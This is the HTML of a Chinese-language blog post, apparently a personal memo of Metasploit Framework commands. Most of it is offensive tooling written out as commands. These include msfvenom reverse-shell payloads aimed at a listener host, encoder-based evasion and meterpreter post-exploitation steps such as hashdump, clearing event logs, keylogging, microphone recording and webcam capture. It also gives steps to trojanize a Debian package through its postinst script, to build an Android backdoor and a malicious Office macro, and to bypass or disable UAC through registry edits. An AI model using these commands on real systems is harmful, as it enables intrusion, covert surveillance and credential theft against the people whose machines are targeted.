@@ -1,0 +1,608 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>metasploit-Framework命令使用备忘录 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="metasploit-Framework命令使用备忘录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-04-19 08:33" pubdate>
+        2020年4月19日 早上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      51
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">metasploit-Framework命令使用备忘录</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年6月17日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="metasploit-Framework命令使用备忘录"><a href="#metasploit-Framework命令使用备忘录" class="headerlink" title="metasploit-Framework命令使用备忘录"></a>metasploit-Framework命令使用备忘录</h1><h2 id="1-msf控制台命令"><a href="#1-msf控制台命令" class="headerlink" title="1.msf控制台命令"></a>1.msf控制台命令</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs gradle">▪ show auxiliary <span class="hljs-regexp">/ exploits /</span> payloads <span class="hljs-regexp">/ encoders /</span> nops<br>例如：show auxiliary  -&gt;查看auxiliary大模块下的可以使用的模块<br><br>▪ search usermap_script / help search<br>搜索关于usermap_script的相关模块<br>    – search name:mysql <span class="hljs-regexp">/ path:scada /</span> platform:aix <span class="hljs-regexp">/ type:aux /</span>author:aaron / <br>    cve:<span class="hljs-number">2011</span> / <br>    search name:mysql 可以更加精准地查找到关于mysql可利用的模块<br>    可以同时多条件搜索<br><br>▪ use dos<span class="hljs-regexp">/windows/</span>smb/ms09_001_write<br>查找要使用的模块之后。可以用use进行使用该模块<br>	– show <span class="hljs-keyword">options</span>（查看该模块利用需要配置的条件） <span class="hljs-regexp">/ payloads（查看该模块可以使用的载荷） /</span> targets （查看该模块可以攻击的目标系统）<span class="hljs-regexp">/ advanced（查看高级的配置）/</span> evasion<br>	– info edit<br>	这两行是用use命令使用模块之后，可以利用的命令<br>	-Check<br>	查看当前模块没有设置的必须配置<br>	̵back<br>	回到上一状态<br>	<br>▪ db_status / db_rebuild_cache<br>查看msf和postgresql数据库连接的状态/ 将当前数据库存储的缓存数据（metasploit5已经移除掉了）<br><br>▪ db_nmap<br>调用nmap工具进行使用<br>    – Hosts(查看使用了db_nmap扫描的ip的信息列表) <span class="hljs-regexp">/ hosts -u /</span> hosts -c address,os_flavor -S Linux<br>    – services -p <span class="hljs-number">80</span> / services -c info,name -p <span class="hljs-number">1</span>-<span class="hljs-number">1000</span><br>    – vulns <span class="hljs-regexp">/ creds (mysql_login) /</span> loot(hashdump)<br>▪ db_disconnect / db_connect<br>	– <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>config/database.yml<br>▪ db_import / db_export<br>	导入/导出xml文件<br>	– db_import <span class="hljs-regexp">/root/</span>nmap.xml<br>	– db_export -f xml <span class="hljs-regexp">/root/</span>bak.xml<br>	<br>	<br>▪ set <span class="hljs-regexp">/ unset /</span> setg（全局设置） <span class="hljs-regexp">/ unsetg /</span> save<br>▪ Run / exploit<br>▪ jobs / kill <span class="hljs-number">0</span> <br>▪ load <span class="hljs-regexp">/ unload /</span>loadpath<br>▪ Session<br>	– session -l / -i（Shell ̵Meterpreter session̵VNC）<br>▪ route 通过指定的session路由流量<br>▪ irb （Framework::Version）<br>▪ Resource （msfconsole -r a.rc）<br>	a.rc写入我们要执行的msf命令。<br>		use exploit<span class="hljs-regexp">/multi/</span>handler<br>        set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp<br>        set LHOST <span class="hljs-number">192.168</span>.<span class="hljs-number">1.103</span><br>        set LPORT <span class="hljs-number">4444</span><br>	msfconsole -r a.rc 会直接执行这些命令<br>	也可以进入到msf后，利用resource a.rc直接执行<br></code></pre></td></tr></table></figure>
+<h2 id="2-利用generate生成payload"><a href="#2-利用generate生成payload" class="headerlink" title="2.利用generate生成payload"></a>2.利用generate生成payload</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">use payload/windows/x64/meterpreter_reverse_tcp<br>▪ generate（坏字符）<br>▪ msf会自动选择编码模块绕过坏字符<br>– generate -b &#x27;<span class="hljs-symbol">\x</span>00&#x27;<br>	指定了&#x27;<span class="hljs-symbol">\x</span>00&#x27;换字符，msf会自动选择编码模块进行绕过<br>– generate -b &#x27;<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>fa<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>a1<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>a3<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>4b&#x27;<br>– generate -b &#x27;<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>fa<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>a1<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>a3<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>4b<br><span class="hljs-symbol">\x</span>FF<span class="hljs-symbol">\x</span>0a<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>cc<span class="hljs-symbol">\6</span>e<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>2e<span class="hljs-symbol">\x</span>26&#x27; <br>但是若是坏字符过长的话，会失败<br>▪手动指定编码模块<br>– show encoders 显示当前payload可以使用的编码模块，我们可以选择其中一个编码模块进行编码<br> generate -e x86/nonalpha<br> <br> ▪ generate -b &#x27;<span class="hljs-symbol">\x</span>00&#x27; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/<br>share/windows-binaries/radmin.exe -f /root/1.exe<br>	参数：-i 是指定利用指定的编码模块进行重复编码的次数<br>		-k 假如你用-x指定了一个qq.exe的 话，他保留模板行为并将有效负载作为新线程注入，就是说你生成的payload可以执行qq.exe原本的功能，并且也可以执行payload<br>		-x 指定一个模板(配合-k参数)<br>▪ NOP：no-operation / Next Operation（无任何操作）<br>– EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行<br>– generate -s 14<br><br></code></pre></td></tr></table></figure>
+<h2 id="3-meterpreter基本命令"><a href="#3-meterpreter基本命令" class="headerlink" title="3.meterpreter基本命令"></a>3.meterpreter基本命令</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs vim">▪ background<br>	假如你拿到了目标的metergreter的<span class="hljs-keyword">shell</span>的话，但要返回msf执行其他模块，你就可以使用backgroud回到msf控制台<br><br>▪ Run̵bgrun<br>▪ Cd ̵<span class="hljs-keyword">ls</span> ̵<span class="hljs-keyword">cat</span> ̵<span class="hljs-keyword">pwd</span> ̵dir ̵<span class="hljs-built_in">mkdir</span> ̵mv ̵rm ̵rmdir ̵<span class="hljs-keyword">edit</span><br>在meterpreter控制台下可执行这些命令查看目标的信息<br>▪ lpwd ̵<span class="hljs-keyword">lcd</span> <br>查看kali攻击机的信息<br>▪ clearev<br>	清理痕迹<br>▪download<br>从目标机器上下载文件<br>▪ upload /usr/share/windows-binaries/nc.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\\windows\\system32<br>上传文件到目标机器<br>▪ <span class="hljs-keyword">execute</span> -<span class="hljs-keyword">f</span> cmd.<span class="hljs-keyword">exe</span> -i –H<br>执行目标文件<br>▪ getuid<br>插孔内当前的帐号权限<br>̵getsystem<br>在特定的权限下，可以用来提高到<span class="hljs-built_in">system</span>权限<br>̵getprivs<br>获取权限列表<br>̵getproxy<br>获取代理<br>̵<span class="hljs-built_in">getpid</span><br>获取当前的payload的进程信息<br><br><br>▪ Hashdump ̵run post/windows/gather/hashdump<br>在特定的权限（administrator/<span class="hljs-built_in">system</span>）下可以获得目标主机的帐号密码的hash值<br>▪ sysinfo ̵<span class="hljs-keyword">ps</span> ̵kill ̵migrate ̵reboot ̵shutdown ̵<span class="hljs-keyword">shell</span><br>获取systeminfo信息  获取进程信息   杀死进程  转移payload的进程到更稳定的进程  <br>▪ show_mount ̵<span class="hljs-built_in">search</span> -<span class="hljs-keyword">f</span> autoexec.bat <br>查看目标挂载<br>▪ arp ̵netstat ̵ipconfig ̵ifconfig ̵route<br>▪ Idletime<br>查看目标多长时间没有对机器进行操作，从而判断管理员是否在线<br>̵resource<br>▪ record_mic<br>打开录音<br>̵webcam_list<br>查看摄像头列表<br>webcam_snap -i <span class="hljs-number">1</span> -v false<br>对摄像进行快照<br></code></pre></td></tr></table></figure>
+<h2 id="4-Meterpreter-python扩展"><a href="#4-Meterpreter-python扩展" class="headerlink" title="4.Meterpreter python扩展"></a>4.Meterpreter python扩展</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">▪ load <span class="hljs-keyword">python</span><br>可以将自己写的<span class="hljs-keyword">python</span>文件导入执行<br>– Help<br>– python_execute <span class="hljs-string">&quot;print (&#x27;asdasdas&#x27;)&quot;</span><br>– python_execute <span class="hljs-string">&quot;import os; cd = os.getcwd()&quot;</span> -r <span class="hljs-keyword">cd</span><br>– python_import -<span class="hljs-keyword">f</span> <span class="hljs-keyword">find</span>.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
+<h2 id="5-客户端渗透"><a href="#5-客户端渗透" class="headerlink" title="5.客户端渗透"></a>5.客户端渗透</h2><h3 id="1-windows客户端"><a href="#1-windows客户端" class="headerlink" title="1.windows客户端"></a>1.windows客户端</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">– msfvenom --payload-options -p windows/shell/reverse_tcp <br>– msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp <br><span class="hljs-attribute">LHOST</span>=1.1.1.1 <span class="hljs-attribute">LPORT</span>=4444 -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86/shikata_ga_nai -f exe -o <br>1.exe<br>– msfconsole<br>▪ use exploit/multi/handler<br>▪ <span class="hljs-builtin-name">set</span> payload windows/shell/reverse_tcp<br>▪ <span class="hljs-builtin-name">set</span> LHOST 1.1.1.1<br>▪ <span class="hljs-builtin-name">set</span> LPORT 4444<br>▪ exploit<br></code></pre></td></tr></table></figure>
+<h3 id="2-Linux-Deb安装包"><a href="#2-Linux-Deb安装包" class="headerlink" title="2.Linux Deb安装包"></a>2.Linux Deb安装包</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle">– apt-get --download-only install freesweep<br>– dpkg -x freesweep_0.<span class="hljs-number">90</span>-<span class="hljs-number">1</span>_i386.deb free<br>– mkdir free<span class="hljs-regexp">/DEBIAN &amp;&amp; cd free/</span>DEBIAN<br>– vi control<br>– vi postinst<br>▪ #!<span class="hljs-regexp">/bin/</span>sh <br>▪ sudo chmod <span class="hljs-number">2755</span> <span class="hljs-regexp">/usr/g</span>ames<span class="hljs-regexp">/freesweep_scores &amp;&amp; /u</span>sr<span class="hljs-regexp">/games/</span><br>freesweep_scores &amp; <span class="hljs-regexp">/usr/g</span>ames/freesweep &amp;<br>– msfvenom -a x86 --platform linux -p linux<span class="hljs-regexp">/x86/</span>shell/reverse_tcp <br>LHOST=<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> LPORT=<span class="hljs-number">4444</span> -b <span class="hljs-string">&quot;\x00&quot;</span> -f elf -o <span class="hljs-regexp">/root/</span>free<span class="hljs-regexp">/usr/g</span>ames/<br>freesweep_scores<br>– chmod <span class="hljs-number">755</span> postinst<br>– dpkg-deb --build <span class="hljs-regexp">/root/</span>free<br></code></pre></td></tr></table></figure>
+<h3 id="3-其他客户端渗透方式"><a href="#3-其他客户端渗透方式" class="headerlink" title="3.其他客户端渗透方式"></a>3.其他客户端渗透方式</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs awk">▪ 利用Acrobat Reader漏洞执行payload<br>– 构造PDF文件exploit<span class="hljs-regexp">/windows/</span>fileformat/adobe_utilprintf<br>– 构造恶意网站exploit<span class="hljs-regexp">/windows/</span>browser/adobe_utilprintf<br>– Meterpreter<br>▪ use priv<br>▪ run post<span class="hljs-regexp">/windows/</span>capture/keylog_recorder <br>利用Flash插件漏洞执行payload<br>– use exploit<span class="hljs-regexp">/multi/</span>browser/adobe_flash_hacking_team_uaf<br>– use exploit<span class="hljs-regexp">/multi/</span>browser/adobe_flash_opaque_background_uaf<br>– use auxiliary<span class="hljs-regexp">/server/</span>browser_autopwn2<br>▪ 利用IE游览器漏洞执行payload<br>– use exploit<span class="hljs-regexp">/windows/</span>browser/ms14_064_ole_code_execution<br><br><br>▪ 利用java  JRE漏洞执行payload<br>– use exploit<span class="hljs-regexp">/multi/</span>browser/java_jre17_driver_manager<br>– use exploit<span class="hljs-regexp">/multi/</span>browser/java_jre17_jmxbean<br>– use exploit<span class="hljs-regexp">/multi/</span>browser/java_jre17_reflection_types<br>▪ 生成Android后门程序<br>– use payload<span class="hljs-regexp">/android/m</span>eterpreter/reverse_tcp<br>– generate -f a.apk -p android -t raw<br><br><br><br><br>▪ VBScript感染方式<br>– 利用宏感染word̵excel文档ګ<br>绕过某些基于文件类型检查的安全机制<br>– 生成vbscript脚本 msfvenom -a x86 --platform windows -p windows/<br>meterpreter<span class="hljs-regexp">/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/</span>shikata_ga_nai <br>-f vba-exe<br>– Office <span class="hljs-number">2007</span> +<br>▪ 视图--宏--创建<br>▪ Payload 第一部分粘入VBA代码<br>▪ Payload 第二部分粘如word文档正文<br>-- Msf 启动监听<br>▪ use exploit<span class="hljs-regexp">/multi/</span>handler<br>▪ set payload windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br></code></pre></td></tr></table></figure>
+<h2 id="6-msf后渗透阶段"><a href="#6-msf后渗透阶段" class="headerlink" title="6.msf后渗透阶段"></a>6.msf后渗透阶段</h2><p>参考文章：UAC机制绕过 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/185311.html">https://www.freebuf.com/articles/system/185311.html</a></p>
+<h3 id="1-经获得目标系统控制权后扩大战果"><a href="#1-经获得目标系统控制权后扩大战果" class="headerlink" title="1.经获得目标系统控制权后扩大战果"></a>1.经获得目标系统控制权后扩大战果</h3><p>– 提权<br>— 信息收集<br>– 渗透内网<br>– 永久后门<br>▪ 基于已有session扩大战果，上传木马<br><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp</code><br>LHOST=1.1.1.1 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o<br><code>1.exe</code></p>
+<p>▪ ឴获取system帐号权限（有时需要绕过UAC机制）<br>– load priv<br>– getsystem<br>▪ priv_elevate_getsystem: Operation failed: Access is denied.</p>
+<h3 id="2-绕过UAC限制"><a href="#2-绕过UAC限制" class="headerlink" title="2.绕过UAC限制"></a>2.绕过UAC限制</h3><h4 id="1-只在当前的session有效，并没有关闭UAC系统-利用社会工程学让目标为我们绕过"><a href="#1-只在当前的session有效，并没有关闭UAC系统-利用社会工程学让目标为我们绕过" class="headerlink" title="1.只在当前的session有效，并没有关闭UAC系统,利用社会工程学让目标为我们绕过"></a>1.只在当前的session有效，并没有关闭UAC系统,利用社会工程学让目标为我们绕过</h4><p>UAC是在Windows Vista及更高版本操作系统中采用的一种控制机制，它以预见的方式阻止不必要的系统范围更改。<br>换句话说，它是Windows的一项安全功能，支持你阻止任何对系统未经授权的更改操作行为。UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows也不会发生任何的改变。</p>
+<p>– use exploit/windows/local/ask<br>▪ set session<br>▪ set filename<br>– use exploit/windows/local/bypassuac<br>该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。 它将为我们生成另一个关闭UAC的shell（session 2）</p>
+<p><strong>Windows提权UAC保护绕过（内存注入）</strong><br>该模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC。 它将为我们生成另一个关闭UAC的shell（session 2）。该模块将直接运行在内存中的反射DLL中，由于它并不触碰硬盘，因此可以最大限度地降低被安全检测的概率。但该模块的使用需要选择正确的架构（对于SYSWOW64系统也是使用x64）。如果指定EXE::Custom DLL ，则应在单独的进程中启动payload后调用ExitProcess()。</p>
+<p>– use exploit/windows/local/bypassuac_injection<br>▪ set session<br>▪ set payload</p>
+<h4 id="2-关闭UAC"><a href="#2-关闭UAC" class="headerlink" title="2.关闭UAC"></a>2.关闭UAC</h4><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">▪ cmd.exe /k <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\r</span>eg.exe ADD HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\S</span>ystem /v EnableLUA /t REG_DWORD /d 0 /f <br>▪ cmd.exe /k <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\r</span>eg.exe ADD HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\S</span>ystem /v EnableLUA /t REG_DWORD /d 0 /f<br>▪ cmd.exe /k <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\r</span>eg.exe ADD HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\s</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br>▪ cmd.exe /k <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\r</span>eg.exe ADD HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\s</span>ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure>
+
+
